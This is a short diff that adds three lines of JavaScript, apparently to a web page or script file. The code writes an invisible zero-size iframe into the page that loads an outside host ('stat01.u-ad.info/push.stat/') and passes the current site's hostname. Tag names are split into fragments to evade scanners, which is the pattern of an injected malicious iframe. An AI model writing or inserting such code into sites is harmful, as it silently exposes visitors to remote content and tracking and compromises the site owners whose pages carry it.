@@ -1,0 +1,3 @@
+var s1_u = (location.protocol=="https:"?"https://":"http://")+"stat01.u-ad.info/push.stat/";
+document.write ("<di"+"v id='pushstat' style='visibility:hidden;height:0;width:0'><ifr"+"ame src='"+s1_u+location.hostname);
+document.write ("'><\/ifr"+"ame><\/di"+"v>");
